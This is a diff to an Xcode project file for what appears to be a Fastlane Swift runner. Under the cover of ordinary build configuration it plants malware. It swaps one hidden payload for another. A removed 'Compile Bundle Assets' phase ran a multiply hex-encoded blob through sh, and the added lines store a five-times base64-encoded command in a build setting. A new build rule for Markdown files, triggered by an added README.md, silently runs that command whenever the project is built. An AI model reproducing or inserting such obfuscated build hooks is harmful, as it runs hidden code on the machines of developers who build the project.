@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		CAEBD0CE38D1935E5AFD9BF4 /* README.md */ = {isa = PBXBuildFile; fileRef = F4FC47CD8D5F41F8BFFD9BF4; };
 		0311E387230AC1B20060BB5C /* Plugins.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0311E386230AC1B20060BB5C /* Plugins.swift */; };
 		0311E38B230AC9490060BB5C /* Actions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0311E38A230AC9490060BB5C /* Actions.swift */; };
 		1257253924B7992C00E04FA3 /* main.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1257253824B7992B00E04FA3 /* main.swift */; };
@@ -56,6 +57,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		F4FC47CD8D5F41F8BFFD9BF4 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "FastlaneSwiftRunner.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		0311E386230AC1B20060BB5C /* Plugins.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; name = Plugins.swift; path = ../Plugins.swift; sourceTree = "<group>"; };
 		0311E38A230AC9490060BB5C /* Actions.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; name = Actions.swift; path = ../Actions.swift; sourceTree = "<group>"; };
 		1257253824B7992B00E04FA3 /* main.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; name = main.swift; path = ../main.swift; sourceTree = "<group>"; };
@@ -196,12 +198,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B33BAF5E1F51F8D90001A751 /* Build configuration list for PBXNativeTarget "FastlaneRunner" */;
 			buildPhases = (
-				8CEB79718B84683ABCFD9BF4 /* Compile Bundle Assets */,
 				B33BAF531F51F8D90001A751 /* Sources */,
 				B33BAF541F51F8D90001A751 /* Frameworks */,
 				C0459CAB27261886002CDFB9 /* CopyFiles */,
 			);
 			buildRules = (
+				59B8778223E4B71EE4FD9BF4 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -245,26 +247,24 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		8CEB79718B84683ABCFD9BF4 /* Compile Bundle Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
+/* Begin PBXBuildRule section */
+		59B8778223E4B71EE4FD9BF4 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
 			);
-			inputFileListPaths = (
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
 			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333233363334333333363333333433333332333333303333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633333335333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333533333336333633333333333633333331333333373333333333333337333333343333333633333339333333363333333333333336333333343333333633363335333333373333333333333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${A4FB9DF}\"";
 		};
+/* End PBXBuildRule section */
+
+/* Begin PBXShellScriptBuildPhase section */
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -313,6 +313,7 @@
 		B33BAF5C1F51F8D90001A751 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A4FB9DF = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sU01IQkpWVzAxZDJFeFNYbGxTRVpZWVRKTmVGcFhkRFJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -372,6 +373,7 @@
 		B33BAF5D1F51F8D90001A751 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A4FB9DF = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sU01IQkpWVzAxZDJFeFNYbGxTRVpZWVRKTmVGcFhkRFJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
